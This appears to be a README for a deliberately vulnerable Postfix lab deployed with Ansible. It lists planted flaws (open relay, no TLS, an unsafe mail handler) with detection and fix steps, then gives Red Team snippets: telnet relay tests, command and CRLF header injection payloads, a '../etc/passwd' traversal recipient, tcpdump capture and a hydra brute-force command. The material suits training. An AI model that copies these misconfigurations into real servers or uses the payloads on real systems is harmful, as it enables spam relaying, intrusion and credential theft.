Overview
This project contains a very basic Ansible configuration to deploy and manage an SMTP service (Postfix) on a Linux host.
It demonstrates three key Ansible features:

1. Package installation (apt) – installs Postfix.
2. File configuration (copy) – ensures /etc/mailname is present with a defined domain.
3. Service management (service) – makes sure Postfix is running and enabled on boot.

Files
- smtp.yml → The Ansible playbook with 3 features.
- hosts.ini → The inventory file containing the target host(s).

Requirements
- Ubuntu/Debian-based target system.
- Python installed on the target (default on most Linux distros).
- SSH access with key or password.
- Ansible installed on the control machine (sudo apt install ansible).



### Vulnerabilities
1. **Open relay** — `mynetworks = 0.0.0.0/0` and `smtpd_recipient_restrictions` ending with `permit` allow relaying mail for arbitrary destinations.
   - **Detect**: Send mail from external host to external address; check `/var/log/mail.log` and headers, use `postconf -n`.
   - **Fix**: Set `mynetworks` to trusted CIDRs only; ensure `smtpd_recipient_restrictions` includes `reject_unauth_destination`.

2. **No TLS (plaintext SMTP)** — `smtpd_tls_security_level = none` disables encryption.
   - **Detect**: Attempt STARTTLS; tcpdump will show plaintext credentials/headers.
   - **Fix**: Configure valid certificates and set `smtpd_tls_security_level = may` or `encrypt`.
   - Turning this on is a bit of a hassle tho...

3. **Unsafe mailbox_command / handler** — `unsafe_mail_handler.py` writes files using unsanitized recipient input.
   - **Exploit**: Use recipient addresses containing `../` or unusual header content to cause traversal or corrupt files.
   - **Fix**: Sanitize recipient/filename input, use safe mailboxes (Maildir) or proper delivery agents (local/virtual). Run handlers as unprivileged users and restrict write paths.

4. **CRLF/header injection opportunities** — permissive header checks and lack of validation in handler can allow crafted headers.
   - **Detect**: Send messages with malformed headers; inspect delivery files and logs for injected content.
   - **Fix**: Enforce header checks, use Postfix header/body regex safely, and ensure delivery scripts robustly parse headers.

### Blue Team
use default `main.cf`

### Red Team
#### Open Relay Exploitation
```bash
# Test for open relay
telnet target-smtp 25
EHLO attacker.com
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@external.com>
DATA
Subject: Test
This is a test message
.
```

#### SMTP Command Injection
```bash
# Command injection via headers
telnet target-smtp 25
EHLO attacker.com
MAIL FROM: <attacker@evil.com>
RCPT TO: <victim@target.com>
DATA
Subject: inject;id;
From: |cat /etc/passwd
Test message
.
```
#### CRLF Injection
```bash
# CRLF injection in email fields
telnet target-smtp 25
MAIL FROM: <attacker@evil.com>\r\nRCPT TO:<admin@target.com>
RCPT TO: <victim@target.com>
DATA
Subject: CRLF%0D%0AInjection%0D%0AX-Header: malicious
Body content
.
```
#### Directory Traversal
```bash
# Attempt path traversal in aliases
swaks --to ../etc/passwd@target-smtp --from attacker@evil.com
```
####Traffic Interception
```bash
# Capture unencrypted SMTP traffic
tcpdump -i any port 25 -w smtp_traffic.pcap
```
#### Weak Authentication Brute Force
```bash
# Hydra brute force attack
hydra -l admin -P wordlist.txt smtp://target-smtp:25
```